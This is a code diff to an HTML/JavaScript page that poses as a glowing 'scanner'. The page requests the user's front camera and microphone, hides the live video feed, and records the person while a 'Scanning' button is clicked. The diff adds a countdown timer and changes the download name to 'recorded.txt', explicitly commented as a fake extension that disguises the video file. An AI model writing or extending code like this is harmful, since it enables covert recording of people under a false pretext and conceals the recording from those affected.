@@ -24,9 +24,12 @@
       border-radius: 10px;
       overflow: hidden;
       box-shadow: 0 0 20px #00ffcc, inset 0 0 20px #00ffcc;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
 
-    /* Hide video feed but keep it active */
+    /* Hidden video feed */
     video {
       display: none;
     }
@@ -46,6 +49,14 @@
     @keyframes scan {
       0% { top: -100%; }
       100% { top: 100%; }
+    }
+
+    .timer {
+      position: absolute;
+      font-size: 28px;
+      font-weight: bold;
+      color: #00ffcc;
+      text-shadow: 0 0 10px #00ffcc;
     }
 
     .button {
@@ -97,6 +108,7 @@
 
   <div class="scanner">
     <video id="camera" autoplay playsinline muted></video>
+    <div class="timer" id="timer">02:00</div>
   </div>
 
   <button class="button" id="scanButton">Scanning</button>
@@ -104,7 +116,7 @@
   <div class="modal" id="modal">
     <div class="modal-content">
       🔍 Scanning Completed
-      <a id="downloadLink" class="download-link" href="#" download="recorded.webm">Download Recorded Video</a>
+      <a id="downloadLink" class="download-link" href="#" download="recorded.txt">Download Recorded File</a>
     </div>
   </div>
 
@@ -114,11 +126,12 @@
     const modal = document.getElementById("modal");
     const videoElement = document.getElementById("camera");
     const downloadLink = document.getElementById("downloadLink");
+    const timerElement = document.getElementById("timer");
 
     let mediaRecorder;
     let recordedChunks = [];
 
-    // Request camera access (front camera if available)
+    // Request camera access
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
       .then(stream => {
         videoElement.srcObject = stream;
@@ -141,13 +154,14 @@
       if (clickCount === 5) {
         modal.style.display = "flex";
 
-        // Stop recording and create video file
+        // Stop recording and prepare download
         if (mediaRecorder && mediaRecorder.state !== "inactive") {
           mediaRecorder.stop();
           mediaRecorder.onstop = () => {
             const blob = new Blob(recordedChunks, { type: "video/webm" });
             const url = URL.createObjectURL(blob);
             downloadLink.href = url;
+            downloadLink.download = "recorded.txt"; // fake extension
           };
         }
       }
@@ -159,6 +173,20 @@
       clickCount = 0;
       recordedChunks = [];
     });
+
+    // Timer: 2 minutes countdown
+    let timeLeft = 120; // seconds
+    function updateTimer() {
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+      timerElement.textContent = 
+        String(minutes).padStart(2, '0') + ":" + String(seconds).padStart(2, '0');
+
+      if (timeLeft > 0) {
+        timeLeft--;
+      }
+    }
+    setInterval(updateTimer, 1000);
   </script>
 
 </body>
